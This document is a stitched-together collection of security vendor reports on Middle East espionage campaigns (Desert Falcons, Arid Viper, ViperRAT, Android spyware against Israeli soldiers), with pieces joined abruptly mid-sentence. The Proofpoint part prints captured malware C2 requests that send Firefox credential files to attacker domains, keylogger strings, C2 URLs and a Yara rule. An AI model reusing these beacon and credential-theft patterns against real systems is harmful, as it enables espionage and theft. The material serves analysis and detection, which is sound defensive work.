2015年2月3日 下午6:09
hxxps:// www.facebook.com/maarivonline/videos/641901115916051/
以色列Maariv Online 媒体
2015年2月1日 下午6:22
hxxps://webcache.googleusercontent.com/search?q=cache:nBi1mbSVr4MJ: https://www.facebook.com/%25D7%2592%25D7%2593%25D7%2595%25D7%2593-%25D7%25A7%25D7%25A8%25D7%25A7%25D7%259C-603984316296466/+&cd=6&hl=en&ct=clnk&gl=us
狞猫营-以色列步兵战斗营
2015年1月31日 5:33
hxxps://webcache.googleusercontent.com/search?q=cache:rtCajoBx_3QJ: https://www.facebook.com/Israe.Army/+&cd=8&hl=en&ct=clnk&gl=us
以色列陆军
2015年2月1日 2:14
hxxps:// www.facebook.com/%D7%97%D7%99%D7%9C-%D7%94%D7%99%D7%9D-553700681378193/
以色列海军
2015年1月31日 下午9:00
hxxps:// www.facebook.com/IAFGiyus/photos/a.364384073628468.82320.321086041291605/846002125466658/?type=1&theater
以色列空军
2015年2月3日
附录B：最新样本查杀结果
脚注： [1]“Havex Hunts For ICS/SCADA Systems”， https://www.f-secure.com/weblog/archives/00002718.html [2]海莲花（OceanLotus）APT组织报告， http://blogs.360.cn/blog/oceanlotus-apt/ [3] hxxps://docs.google.com/file/d/0ByavzARTLomhc3hFeFhGN1JOOE0/edit?pli=1
本文链接： https://blogs.360.cn/post/sphinx_ch.html
-- EOF --
heliosteam
2016-07-01 04:40:08
，添加在分类Download Full Report PDF
The Desert Falcons are a new group of Cyber Mercenaries operating in the Middle East and carrying out Cyber Espionage across that region. The group uses an arsenal of homemade malware tools and techniques to execute and conceal its campaigns on PC and Mobile OS.
#FalconsAPT is the 1st known campaign to be fully developed by Arabic #hackers to target the Middle East #TheSAS2015 Tweet
The first Desert Falcons operations were seen in 2011 and the group made its first infections in 2013. By the end of 2014 and beginning of 2015 the group was very active.
Full report
The full report can be found here .
Where are the Victims Located?
There are more than 3,000 victims in 50+ countries. Most of them are found in Palestine, Egypt, Israel and Jordan, but others have been discovered in Saudi Arabia, the UAE, the US, South Korea, Morocco, Qatar and others.
Who are the Victims?
The attacks targeted several classes of victim, including Military and Government organizations, employees responsible for health organizations, combating money laundering, economic and financial institutions, leading media entities, research and educational institutions, energy and utilities providers, activists and political leaders, physical security companies and other targets that have access to important geopolitical information.
How are the victims infected?
Malware writers use a variety of technical and social engineering methods to deliver their files and encourage victims to run them, creating an effective infection vector. Examples include a fake website that promises to publish censored political information and asks users to download a plugin to view a video (the plugin contains the malware). Another example involves the use of spear phishing emails or social network messages to deliver malicious files using an extension override (e.g. malicious files ending with .fdp.scr would appear .rcs.pdf ).
Sample of documents and videos used in spear phishing
What are the goals of the operations?
The attackers are looking for sensitive intelligence information that could help them in further operations or even extortion. The victims are targeted for the secrets in their possession or intelligence information relating to their positions in governments or important organizations.
More than 1 million files were stolen from victims. Stolen files include diplomatic communications from embassies, military plans and documents, financial documents, VIP and Media contact lists and files.
Who are the attackers and what do we know about them?
The Desert Falcons operators are native Arabic speakers. There are about 30 of them working in three teams. Some of their identities are already known. The attackers are running three campaigns to target different types of victim.
Where are the attackers based?
The attackers are based in Palestine, Egypt and Turkey.
Which malware do they use to infect their victims?
There are three main backdoors used to infect victim devices:
Computer backdoors
The Main Falcons Trojan
The DHS* Spyware Trojan
Computer Backdoors give the attackers full scope to use keyloggers and screenshotters, access files and even make audio recordings. DHS naming is used by the attackers to describe the nickname initials of one of the developers (D** H*** Spyware).
Mobile Backdoor
A mobile backdoor targeting Android devices.
Mobile Backdoors give attackers access to Call and SMS logs
How did you become aware of this threat? Who reported it?
We became aware of the threat during an incident investigation in the Middle East.
Is it still active?
The operation is very active and is currently in peak condition. We are continuously identifying new samples and victims for all related campaigns.
How is this different from any other Cyber espionage attacks?
Desert Falcons are the first known Cyber espionage attacks to be fully developed and operated by Arabic speakers to target the Middle East. It has affected a stunning range of victims, stealing more than 1 million special files.
Is this a nation-state sponsored attack?
The profiles of the targeted victims and the apparent political motives behind the attacks make it possible that Desert Falcons operations could be nation state sponsored. At present, though, this cannot be confirmed.
Why this name?
The falcon is a rare bird that has been highly prized for a centuries in desert countries in the Arab world. It is a symbol of hunting and sharp vision. The Desert Falcons are proficient cyberhunters with carefully chosen targets, all of whom are thoroughly investigated before the attack and closely watched after being infected.
How can users protect themselves?
Kaspersky Lab products detect and block all variants of the malware used in this campaign:
Trojan.Win32.DesertFalcons
Trojan-Spy.Win32.Agent.cncc
Trojan-Spy.Win32.Agent.ctcr
Trojan-Spy.Win32.Agent.ctcv
Trojan-Spy.Win32.Agent.ctcx
Trojan-Spy.Win32.Agent.cree
Trojan-Spy.Win32.Agent.ctbzLast week, we released a research paper titled “ Operation Arid Viper: Bypassing the Iron Dome ” where we detailed two related campaigns. To recall, here are our key findings related to the two campaigns:
Palestinian threat actors have staged a targeted attack, Operation Arid Viper, to exfiltrate data from high-profile targets in the Israeli government and have been doing so since mid-2013. The attacks are still on-going, coinciding with the political tension between Israel and Palestinians.
Investigation of the Germany-hosted server used in Arid Viper revealed a group of Egyptian hackers ( Advtravel ) that have less technical knowhow and are attacking other Egyptians in less purposeful attacks.
Both groups have strong Arab ties, and the same server and site registration details suggest the existence of a supra-organization, a forum or an influential sponsor could be providing various hacking groups with the means to pursue their ends.
Since the report was released, we have continued our investigation and have a number of updates:
None of the C&C domains have moved to other hosting providers or had other major changes since the publishing of our report. Although we have not seen newly compiled samples being spread – we have seen 2 recent attempted infections with existing binaries from Arid Viper on the 15th and 19th of February against a target in Israel and Kuwait respectively. For reference, our paper went public on the 16th.
Interestingly, a number of the people linked to the C&C servers in the paper have made changes to their public profiles since the paper went live. To date none of these individuals have contacted us to dispute the details we outlined in the paper:
The Facebook account we mentioned in the paper for Fathy Mostafa is now no longer active.
Quite a number of the accounts we related to Ebrahim Said El-Sharawy (aka Dev_Hima) have been modified or removed. Upon inspection today, his accounts on Blogspot, Facebook, Twitter, and Hacker.org are no longer active. His main webpage (http://devhima.webs.com) which had hosted two questionable tools we outlined in the report has been changed to remove all of that content and has been replaced with the words “Closed by DevHima”:
Some of his other accounts such as his LinkedIn, SoundHound, and YouTube (which is hard to remove without deleting your personal Gmail account) are still live at the time of writing.
After further investigation, we now believe that the email used to register the C&C pstcmedia[dot]com , khalid.samraa@gmail.com, actually belongs to the Web hosting provider that registered this domain on a client’s behalf – and is not an individual involved in the campaign itself. We have updated our paper to remove reference to Mr. Samraa with the exception that the email address was used to register this site.
Trend Micro will continue to research more on these campaigns over the coming months and post updates as we find them.
Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware: ENTERPRISE » SMALL BUSINESS » HOME »
Tags: advtravel arid viper Gaza Israel Targeted Attack
2016 was an unprecedented year for cybersecurity, particularly for enterprises. The Trend Micro™ Smart Protection Network™ blocked over 81 billion threats in 2016, a 56% increase from the threats blocked in 2015.
Read our 2016 Annual Security Roundup
How can a sophisticated email scam cause more than $2.3 billion in damages to businesses around the world?
See the numbers behind BEC
Latest Tweets
What makes a home #router unsecure? How can security gaps affect home users and small businesses? Learn more here:… twitter.com/i/web/status/8…
about 4 hours ago
In 2016, new #ransomware families increased by 752%. More in our 2016 Security Roundup: https://t.co/A0MoC4c72p… twitter.com/i/web/status/8…
about 22 hours ago
New York City has the highest number of exposed cyber assets in the financial sector. Details:… twitter.com/i/web/status/8…
about 1 day agoEarlier this year, researchers published analyses of targeted attack known as Operation Arid Viper [1] (aka Desert Falcons [2] , aka DHS) directed primarily at organizations in the Middle East. Delivering a backdoor and spyware, this campaign was designed to steal information from infected systems using a malware client capable of filtering out “uninteresting” files, and spread primarily via a targeted phishing email usually promising a pornographic video.
The infection chain described in the initial analyses was fairly straightforward: To access the video content, the recipient had to open an attached RAR archive file – or less frequently, click a link to a RAR – that extracted an SCR (Windows screensaver) file, which in turn drops two files: a malicious EXE with the name of a legitimate file (such as “skype.exe”), and a video format file, usually FLV or MPG.
Despite the apparent severity and extent of this threat, little has been written about it in the intervening months, and the operation appeared to be dormant. However, Proofpoint researchers recently intercepted and analyzed phishing emails distributing Arid Viper malware payloads with some noteworthy updates.
As with the originally documented examples, these messages were part of narrow campaigns targeting specific industry verticals: telecoms, high tech, and business services, primarily in Israel.
In these samples, the spear-phishing email contained a link to a RAR file hosted on MediaFire – no attachments were observed. Instead of a pornographic video, the actors showed a change in TTP by using as lure a video of a fiery automobile accident.
התאונה בכביש // Road accident
וידיו מזעזע דלפ תקשורת // And his shocking leaked to the media
Clicking the linked RAR brings up a prompt to download the file “this.morning.rar” to their computer. (Fig. 1)
Figure 1: Prompt to download RAR to local system
The file “this.morning” is a RAR self-extracting (SFX) archive (cd89897a2b6946a332354e0609c0b8b4). Once downloaded, the user opens the RAR which extracts what appears to be a video file named “this.morning”.
In fact, double-clicking RAR SFX extracts and executes two files contained in this archive:
A non-malicious video file: this.morning.flv (41bf348254b921bbd21350a70f843683)
The malware payload: chrome.exe (2ae0f580728c43b3a3888dfbe76ad689)
In this regard, the infection chain is still similar to that described in the original Operation Arid Viper analysis, but with noticeable changes to the filenames and email lure, among others. The end user will see the promised video, while in the background the malicious “chrome.exe” begins is communication with the command and control (C2) server: in both cases the action is automatic and initiated simply by double-clicking the self-extracting the RAR SFX archive, with no further interaction by the end-user needed. The following is an example of the initial C2 beacon:
GET /Sounds/sound_q.php?p=—[redacted]. HTTP/1.1
Accept: text/*
User-Agent: AudioDrive
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Host: oowdesign [.] com​
Cache-Control: no-cache
And this is an example of the C2 server response:
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 26 Aug 2015 14:11:52 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/5.3.29
The malware payload still uses the type of hard drive and a set of numbers as a unique identifier; for example: VMware-VMwareVirtualSSCSIDisk—[redacted].. Moreover, the malware compile time appears to be quite recent. (Fig. 2)
Figure 2: Malware file details showing compile date
The Trojan continues to exhibit its behavior of downloading an update following the first C2 communication, and in this case Proofpoint researchers succeeded in patching the initial malware to obtain the second stage malware payload (3a401a679d147b070eb8ccae5df3dc43), which allowed us to observe more activities.
Previously described as the Operation Arid Viper backdoor, the second stage payload was observed in traffic to be obfuscated with standard base64-encoding. The second-stage backdoor has a compile date prior to the first stage malware by nearly a day. (Fig. 3)
Figure 3: Malware file details showing compile date
During the infection process, the Arid Viper malware makes multiple HTTP GET requests to register the client with the server and check for updates:
GET /designs/new_user.php?s1=[---UID---]&s2=8 HTTP/1.1 àcall PHP script to login / register the infected machine
GET /designs/is_ok.php?s1=[---UID---] HTTP/1.1 à call PHP script to perform a user check on the server side (server responds with “OK”)
GET /designs/add_recoord.php?s1=[---UID---]&s2=8&s3=2[---Date---]&s4=msn à call PHP script to add a record to the server
GET /designs/get_t.php?s1=[---UID---]&s2=[---Date---]
GET /designs/add_t.php?s1=[---UID---]&s2=[---Date---]
GET /designs/get_r.php?s1=[---UID---]
In addition, the backdoor POSTs data back to the server:
POST /designs/drive_update.php HTTP/1.1 à encrypted data wrapped in a custom base64 encoding is sent via HTTP POST to the C2 server
User-Agent: Realtek
Content-Type: application/x-www-form-urlencoded
Host: smilydesign [.] com
Content-Length: 978
Pragma: no-cache
The Arid Viper backdoor also sends GETs to confirm the existence of interesting data / files, with the path and filenames included in the request. The following exchanges show the GET request (with filename and path in bold), and C2 server response (i.e., “OK”):
GET /designs/send_request_r_data.php?s1=[redacted]&path= C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted]..default/key3.db HTTP/1.1
Accept: text/*
User-Agent: Realtek
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Host: smilydesign.com
Cache-Control: no-cache
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 27 Aug 2015 11:48:19 GMT
Content-Type: text/html
Content-Length: 7
Connection: keep-alive
Keep-Alive: timeout=60
X-Powered-By: PHP/5.3.10-1ubuntu3.17
Vary: Accept-Encoding
GET /designs/send_request_r_data.php?s1=[redacted]&path= C:/Users/COMPUTER/AppData/Roaming/Mozilla/Firefox/Profiles/[redacted].default/logins.json HTTP/1.1
Accept: text/*
User-Agent: Realtek
Accept-Language: en-us
Content-Type: application/x-www-form-urlencoded
Host: smilydesign [.] com
Cache-Control: no-cache
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 27 Aug 2015 11:48:19 GMT
Content-Type: text/html
Content-Length: 7
Connection: keep-alive
Keep-Alive: timeout=60
X-Powered-By: PHP/5.3.10-1ubuntu3.17
Vary: Accept-Encoding
In addition, analysis of the Arid Viper backdoor binary shows evidence of keylogging capabilities:
00000006E2C4 00000046F2C4 0 [The Right KeyPressed]
00000006E2F4 00000046F2F4 0 [The LeFT Key Pressed]
00000006E324 00000046F324 0 [The Down Key Is Pressed]
00000006E358 00000046F358 0 [The Up Key Is Pressed]
00000006E388 00000046F388 0 [left alt+shift]
00000006E3AC 00000046F3AC 0 [right alt+shift]
00000006E3D0 00000046F3D0 0 [Caps Lock]
00000006E3E8 00000046F3E8 0 [Tab Pressed]
00000006E404 00000046F404 0 [Back space Pressed...]
As well as the ability to steal browser data:
00000006DC30 00000046EC30 0 \logins.json
00000006DC40 00000046EC40 0 \key3.db
00000006DC4C 00000046EC4C 0 \Mozilla\Firefox\Profiles\
00000006DC68 00000046EC68 0 .default
00000006DC74 00000046EC74 0 \Mozilla\Firefox\Profiles\*.*
00000006DC94 00000046EC94 0 \Google\Chrome\User Data\Default\Login Data
00000006DCC0 00000046ECC0 0 <i l="%ws" u="%ws" p="%ws"/>
00000006DCE9 00000046ECE9 0
Username: %ws
00000006DCF8 00000046ECF8 0
Password: %ws
00000006DD0C 00000046ED0C 0 Software\Microsoft\Internet Explorer\IntelliForms\Storage2
The Arid Viper backdoor encrypts data to be exfiltrated in order to avoid detection, and after additional analysis Proofpoint researchers succeeded in determining its encryption routine.
Data Exfiltration
The updated data exfiltration of the new Arid Viper backdoor functions similarly to previously documented versions. The table below lists some of the different functionalities paired with the actor-assigned indicator, which can be seen in both the HTTP client body along with exfiltrated data as well as in the URI once exfiltration is complete. (Table 1)
Exfiltration type
Description
Computer name, user name, as well as Windows Live credentials (if found) are exfiltrated as plaintext data before encryption
A “directory tree” of files and directories. This is stored compressed in a password-protected zip.
A keylog containing a list of programs and keystrokes recorded in each program. This file is transmitted in a password-protected zip.
A password-protected zip containing the exfiltrated file named as file.dll as well as a text file (name.txt) containing the original full path and name of the exfiltrated file.
Screenshots are taken every ~5 minutes in the initial function. Several screenshots are then compressed into a password-protected zip file
Table 1: Arid Viper exfiltration types and descriptions
Captured C2 traffic provides an example of the network traffic seen during a msn data exfiltration. (Fig. 4)
Figure 4: Example network traffic during data exfiltration
Although the data that is exfiltrated and the manner in which it is gathered remain largely the same as in previously documented versions, the final result that is transmitted to an attacker-controlled server has changed significantly. In an older version of this backdoor (md5: aefea9d795624da16d878dc9bb81bf87), exfiltrated data was simply base64-encoded using a slightly modified base64 alphabet (“-” instead of “+”). In the newer version, prior to base64 encoding the exfiltrated data is first encrypted with AES-256 in CBC mode. The encryption process is depicted in Figure 5 and explained below.
Figure 5: Arid Viper encryption process for data exfiltration
To generate the key/IV pair, first the malware randomly generates 60 bytes of data. From this, the first 32-bytes are used for the key, the next byte is skipped, and the following 16 bytes are used for the IV. After encryption, the key, separator byte, IV, leftover bytes and padding are then encoded into a 512-byte block of data and prepended to the encrypted data. The encoded key/IV and encrypted data are then base64-encoded using the same modified alphabet. Just like in the older version, this data is then appended to the final variable in the POST’s HTTP client body and sent to an attacker-controlled server.
Reinventing the wheel
Numerous examples over the years have served to remind us that designing your own cryptography implementation is difficult and usually ill-advised. The authors of the updated Arid Viper backdoor seem to have overlooked this lesson for, although certain measures have been taken to protect the generated secret keys and IVs, their implementation is susceptible to a brute force attack, often capable of finding the correct key/IV combination in less than one second. Cracking the encryption scheme applied to the traffic in Figure 4 reveals the following decrypted cleartext. (Fig. 6)
Figure 6: Decrypted data from example network traffic in Figure 4
Determining the encryption scheme that is applied to the updated Arid Viper backdoor’s exfiltrated data enables us to better detect C2 communication while also rapidly determining the extent and impact of the data breach carried out by the malware client.
Conclusion
In summary, this update to Operation Arid Viper demonstrates that despite its relatively low profile since February the Arid Viper / Desert Falcons threat still has teeth and remains a risk for organizations in Israel and elsewhere. While the overall attack profile observed in recent examples remains similar to the originally documented campaigns, the recent campaigns exhibit several important updates:
Use of links instead of attachments
New lures: still using pornographic video but most recent detections also included lures for auto accident footage
New executable name: originally reported using “skype.exe” (and variations on “skype”), the recent samples used “chrome.exe”
New C2 domains
Added encryption for exfiltrated data
The return of Operation Arid Viper shows that targeted attacks can remain a threat even – and especially – when they are no longer in the headlines,
References
[1] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-arid-viper.pdf
[2] https://securelist.com/blog/research/68817/the-desert-falcons-targeted-attacks/
Indicators of Compromise (IOCs)
Observed C2 domains and IP addresses:
smilydesign [.] com / 195.154.252.2
yalladesign [.] net / 173.236.89.19
oowdesign [.] com / 195.154.133.228
coldydesign [.] com / 195.154.252.2
Attachment and payload hashes for this sample:
this.morning.rar - cd89897a2b6946a332354e0609c0b8b4
this.morning.exe - 2ae0f580728c43b3a3888dfbe76ad689
RtlUpd.exe - 3a401a679d147b070eb8ccae5df3dc43
Attachment and payload hashes for all campaigns observed since July 1:
8dc2cef74f9e577b431ad3569c894dc07c8c429ef04235936587ac0e70e2993c
d3c184840805a280895387bf321a15a3dfc6af28314983c535e332cbcee7faf0
9cd995095d351b31512fc8866f21bc90624306408a6552879a7dc9317848d877
e6e65932473a14d2d104c11234a391fc68c6874f06054a7a019facf5da9498a8
f05e913be22eebb19143886b75ca59842d9ce6cf355c23375aa80fdbccad3ec0
343674e2b89e6e786ba08718e0672f3ff21a826c6a4e6e4f41dbd5af3157031d
c21891edf9a88953fe49c2aa24ed51e093004a865269ac88a5f3fc149762bd2b
658f63baa9dd4fcc031114ea579e3423d19cb81128a5c577cc5ad10c669b950f
1710997941193e52e6251638cf80e8ea6a520624f5ebe4583f974252cb8d4881
94f0f5f4849632fd68cce11f6247bb90e426842aa8aee8974f5b0abea2a85748
16c687fdb35ec21482b5b07aee274fdc4fc8c5c0928cb5de441c5b3e84ba98ad
ff73aa398636a01595d4762a925e1e1b976f85306663c22e7200db74c093f27e
56a3ee282a25fbb234651fe3771574056576aa68e25e05587c5a443ddd0f59fc
d7de32c9ab9265d1dd900688c91d3468e05f88f98bd67bbd883450db44df045e
39fc67689c28a31183a7e1d499e8a4bfeb06fc629cf567c1b6c245edb6564d16
1f3b4ceea2e3054162260bb827a5c867d5615b15c68e065d97a99a892d5cad4e
109d248b9dabb019e4d2d82552c63d84ab14e931af40c6f3a09a3df3a40212f2
03eff13ea629acfff6416d95f674195b4fbaa158914e8f9d5ac1f5e094a60fae
Files and paths indicating infection:
C:\Program Files\Realtek\AudRT.dll
C:\Program Files\Realtek\AudRTx32.dll
C:\Program Files\Realtek\AudRTx86.dll
C:\Program Files\Realtek\cn.dll
C:\Program Files\Realtek\ffmencrypt_secret.key
C:\Program Files\Realtek\ffmUntitled
C:\Program Files\Realtek\ffsk
C:\Program Files\Realtek\ffsk1
C:\Program Files\Realtek\files
C:\Program Files\Realtek\flfiles
C:\Program Files\Realtek\fmencrypt_secret.key
C:\Program Files\Realtek\fmUntitled
C:\Program Files\Realtek\fsk
C:\Program Files\Realtek\fsk1
C:\Program Files\Realtek\gfile
C:\Program Files\Realtek\gmencrypt_secret.key
C:\Program Files\Realtek\gmUntitled
C:\Program Files\Realtek\gsk
C:\Program Files\Realtek\gsk1
C:\Program Files\Realtek\IM.dll
C:\Program Files\Realtek\imencrypt_secret.key
C:\Program Files\Realtek\ImRt.dll
C:\Program Files\Realtek\ImRtx86.dll
C:\Program Files\Realtek\imUntitled
C:\Program Files\Realtek\isk
C:\Program Files\Realtek\isk1
C:\Program Files\Realtek\lmencrypt_secret.key
C:\Program Files\Realtek\lmUntitled
C:\Program Files\Realtek\lsk
C:\Program Files\Realtek\lsk1
C:\Program Files\Realtek\mmencrypt_secret.key
C:\Program Files\Realtek\mmUntitled
C:\Program Files\Realtek\msk
C:\Program Files\Realtek\msk1
C:\Program Files\Realtek\Realtek.dll
C:\Program Files\Realtek\rfiles
C:\Program Files\Realtek\rfmencrypt_secret.key
C:\Program Files\Realtek\rfmUntitled
C:\Program Files\Realtek\rfsk
C:\Program Files\Realtek\rfsk1
C:\Program Files\Realtek\RRTM.dll
C:\Program Files\Realtek\RRTM.dllm
C:\Program Files\Realtek\Rt.inf
C:\Program Files\Realtek\Rtd.ini
C:\Program Files\Realtek\Rtf.dll
C:\Program Files\Realtek\Rtf32.dll
C:\Program Files\Realtek\Rtf64.dll
C:\Program Files\Realtek\Rtg.dll
C:\Program Files\Realtek\Rtgx32.dll
C:\Program Files\Realtek\Rtgx64.dll
C:\Program Files\Realtek\Rtled.tmp
C:\Program Files\Realtek\Rtlupd.conf
C:\Program Files\Realtek\RTlx32.dll
C:\Program Files\Realtek\RTlx64.dll
C:\Program Files\Realtek\RTlx86.dll
C:\Program Files\Realtek\RTM.dll
C:\Program Files\Realtek\Rtrfl
C:\Program Files\Realtek\Rttr.dlt
C:\Program Files\Realtek\Rttr.zip
C:\Program Files\Realtek\tmencrypt_secret.key
C:\Program Files\Realtek\tmUntitled
C:\Program Files\Realtek\tsk1
C:\Program Files\Realtek0.txt
C:\Program Files\Realtek\REF\OK
Detection
The following Yara rule can detect the updated Arid Viper backdoor traffic:
rule AVIDVIPER_APT_BACKDOOR {
meta:
author = "Proofpoint Staff"
info = "avid viper update"
strings:
$s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-/"
$s2 = "SELECT * FROM Win32_DiskDrive" wide ascii
$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide ascii
$s4 = " \\dd\\vctools\\vc7libs\\ship\\atlmfc " wide ascii
condition:
$s4 and 2 of ($s1,$s2,$s3)
In addition, Proofpoint Emerging Threats (ET) has a variety of signatures for detecting older and updated versions of Arid Viper and Desert Falcons.
Arid Viper:
ET Open signatures: 2020431-2020454
ET Pro signatures: 2812701, 2812729
Desert Falcon:
ET Open: 2020459, 2020461, 2020462, 2020464-2020469, 2020472ViperRAT is an active, advanced persistent threat (APT) that sophisticated threat actors are actively using to target and spy on the Israeli Defense Force.The threat actors behind the ViperRAT surveillanceware collect a significant amount of sensitive information off of the device, and seem most interested in exfiltrating images and audio content. The attackers are also hijacking the device camera to take pictures. Using data collected from the Lookout global sensor network, the Lookout research team was able to gain unique visibility into the ViperRAT malware, including 11 new, unreported applications. We also discovered and analyzed live, misconfigured malicious command and control servers (C2), from which we were able to identify how the attacker gets new, infected apps to secretly install and the types of activities they are monitoring. In addition, we uncovered the IMEIs of the targeted individuals (IMEIs will not be shared publicly for the privacy and safety of the victims) as well as the types of exfiltrated content. In aggregate, the type of information stolen could let an attacker know where a person is, with whom they are associated (including contacts’ profile photos), the messages they are sending, the websites they visit and search history, screenshots that reveal data from other apps on the device, the conversations they have in the presence of the device, and a myriad of images including anything at which device’s camera is pointed. Lookout has determined ViperRAT is a very sophisticated threat that adds to the mounting evidence that targeted mobile attacks against governments and business is a real problem. Lookout researchers have been tracking this threat for the last month. Given that this is an active threat, we’ve been working behind-the-scenes with our customers to ensure both personal and enterprise customers are protected from this threat and only decided to come forward with this information after the research team at Kaspersky released a report earlier today. Additionally, we have determined that though original reports of this story attribute this surveillanceware tool to Hamas, this may not be the case, as we demonstrate below. The increasing sophistication of surveillanceware The structure of the surveillanceware indicates it is very sophisticated. Analysis indicates there are currently two distinct variants of ViperRAT. The first variant is a “first stage application,” that performs basic profiling of a device, and under certain conditions attempts to download and install a much more comprehensive surveillanceware component, which is the second variant. The first variant involves social engineering the target into downloading a trojanized app. Previous reports alleged this surveillanceware tool was deployed using ‘honey traps’ where the actor behind it would reach out to targets via fake social media profiles of young women. After building an initial rapport with targets, the actors behind these social media accounts would instruct victims to install an additional app for easier communication. Specifically, Lookout determined these were trojanized versions of the apps SR Chat and YeeCall Pro. We also uncovered ViperRAT in a billiards game, an Israeli Love Songs player, and a Move To iOS app. The second stage The second stage apps contain the surveillanceware capabilities. Lookout uncovered nine secondary payload applications: * These apps have not been previously reported and were discovered using data from the Lookout global sensor network, which collects app and device information from over 100 million sensors to provide researchers and customers with a holistic look at the mobile threat ecosystem today. Naming additional payload applications as system updates is a clever technique used by malware authors to trick victims into believing a threat isn’t present on their device. ViperRAT takes this one step further by using its dropper app to identify an appropriate second stage ‘update’ that may go unnoticed. For example, if a victim has Viber on their device, it will choose to retrieve the Viber Update second stage. If he doesn’t have Viber, the generically-named System Updates app gets downloaded and installed instead. What was taken The actors behind ViperRAT seem to be particularly interested in image data. We were able to identify that 8,929 files had been exfiltrated from compromised devices and that the overwhelming majority of these, 97 percent, were highly likely encrypted images taken using the device camera. We also observed automatically generated files on the C2, indicating the actor behind this campaign also issues commands to search for and exfiltrate PDF and Office documents. This should be highly alarming to any government agency or enterprise. We observed legitimate exfiltrated files of the following types of data:
Contact information
Compressed recorded audio in the Adaptive Multi-Rate (amr) file format
Images captured from the device camera
Images stored on both internal device and SDCard storage that are listed in the MediaStore
Device geolocation information
SMS content
Chrome browser search history and bookmarks
Call log information
Cell tower information
Device network metadata; such as phone number, device software version, network country, network operator, SIM country, SIM operator, SIM serial, IMSI, voice mail number, phone type, network type, data state, data activity, call state, SIM state, whether device is roaming, and if SMS is supported.
Standard browser search history
Standard browser bookmarksAround July last year, more than a 100 Israeli servicemen were hit by a cunning threat actor. The attack compromised their devices and exfiltrated data to the attackers’ command and control server. In addition, the compromised devices were pushed Trojan updates, which allowed the attackers to extend their capabilities. The operation remains active at the time of writing this post, with attacks reported as recently as February 2017.
The campaign, which experts believe is still in its early stages, targets Android OS devices. Once the device is compromised, a process of sophisticated intelligence gathering starts, exploiting the ability to access the phone’s video and audio capabilities, SMS functions and location.
The campaign relies heavily on social engineering techniques, leveraging social networks to lure targeted soldiers into both sharing confidential information and downloading the malicious applications.
Characterized by relatively unsophisticated technical merit, and extensive use of social engineering, the threat actor targets only IDF soldiers.
IDF C4I & the IDF Information Security Department unit, with Kaspersky Lab researchers, have obtained a list of the victims; among them IDF servicemen of different ranks, most of them serving around the Gaza strip.
Attack Flow
The operation follows the same infection flow across the different victims:
Figure 1: Campaign’s attack flow
Social Engineering
The threat actor uses social engineering to lure targets into installing a malicious application, while continuously attempting to acquire confidential information using social networks. We’ve seen a lot of the group’s activity on Facebook Messenger. Most of the avatars (virtual participants in the social engineering stage) lure the victims using sexual innuendo, e.g. asking the victim to send explicit photos, and in return sending fake photos of teenage girls. The avatars pretend to be from different countries such as Canada, Germany, Switzerland and more.
Dropper
After the victim downloads the APK file from the malicious URL, the attacker expects the victim to install the package manually. The dropper requires common user permissions as shown in the following screenshot.
Figure 2: Dropper permissions once installed on a victim mobile device
Key features
The dropper relies on the configuration server which uses queries in order to download the best fitting payload for the specified device.
Downloader & Watchdog of the main payload
Payload update mechanism
Customized payload – the dropper sends a list of installed apps, and receives a payload package based on it
Obfuscation – The dropper package is obfuscated using ProGuard, which is an open source code obfuscator and Java optimizer, observed in the LoveSongs dropper.
Network Protocols
The network protocol between the dropper and the configuration server is based on HTTP POST requests. The following servers implement a RESTful API:
LoveSongs – http://endpointup[.]com/update/upfolder/updatefun.php
YeeCall, WowoMessanger – http://droidback[.]com/pockemon/squirtle/functions.php
Figure 3: Communication with C&C server over HTTP
Most of the communication with the server is in clear-text, except for specific commands which are encrypted using an AES-128 hard coded-key.
Figure 4: WowoMessanger REST-API POST packet capture
Figure 5: Fake WowoMessanger app – logic flow
Along with an ID existence check, the dropper sends a list of the device’s installed apps – if it hasn’t done so already.
The flow between different variants of the dropper is similar, with minor changes. One variant pretends to be a YouTube player, while others are chat apps:
LoveSongs has YouTube player functionality, whereas WowoMessanger does not have any legitimate functionality whatsoever; it erases its icon after the first run.
Payload
The payload is installed after one of the droppers mentioned above has been downloaded and executed on the victim device. The only payload we have seen so far is “WhatsApp_Update”.
The payload is capable of two collection mechanisms:
Execute “On demand” commands – manual commands that are triggered by the operator
Scheduled process – scheduled tasks that collect information periodically from various sources.
Most of the collected data will be sent only when a WI-FI network is available.
C&C Commands
The payload uses the WebSocket protocol, which gives the attacker a real-time interface to send commands to the payload in a way that resembles ‘reverse shell’. Some of the commands are not yet implemented (as shown in the table below). The commands gives the operator basic yet dangerous RAT capabilities:
Collect general information about the device e.g. Network operator, GPS location, IMEI etc.
Open a browser and browse to a chosen URL
Read & send SMS messages, and access contacts
Eavesdrop at a specific time and period
Take pictures (using the camera) or screenshots
Record video and audio.
*Commands which were implemented are in bold.
Scheduled Process
Besides the C&C commands, the payload periodically collects data using various Android APIs. The default time interval is 30 seconds. The process collects the following data:
General data about the device (as mentioned in the C&C command)
SMS messages, WhatsApp database along with the encryption key (requires root permissions which is not yet fully implemented)
Browsing & search history along with bookmarks
Documents and archives ( < 2MB ) found in storage (doc, docx, ppt, rar, etc)
Pictures taken, auto captures while on an active call
List of contacts and call logs
Records calls and eavesdrops
Updates itself
The attackers implemented all of the malicious logic without any native or third-party sources. The logic behind the automatic call-recording feature is implemented entirely using Android’s API.
Figure 6: Call-Recording implementation in WhatsApp_update
Conclusions
The IDF, which led the research along with Kaspersky Lab researchers, has concluded that this is only the opening shot of this operation. Further, that it is by definition a targeted attack against the Israeli Defense Force, aiming to exfiltrate data on how ground forces are spread, which tactics and equipment the IDF is using and real-time intelligence gathering.
Kaspersky Lab GReAT researchers will disclose more behind-the-scenes details of the operation at the upcoming Security Analyst Summit .
Domain names & APK hashes
androidbak[.]com
droidback[.]com
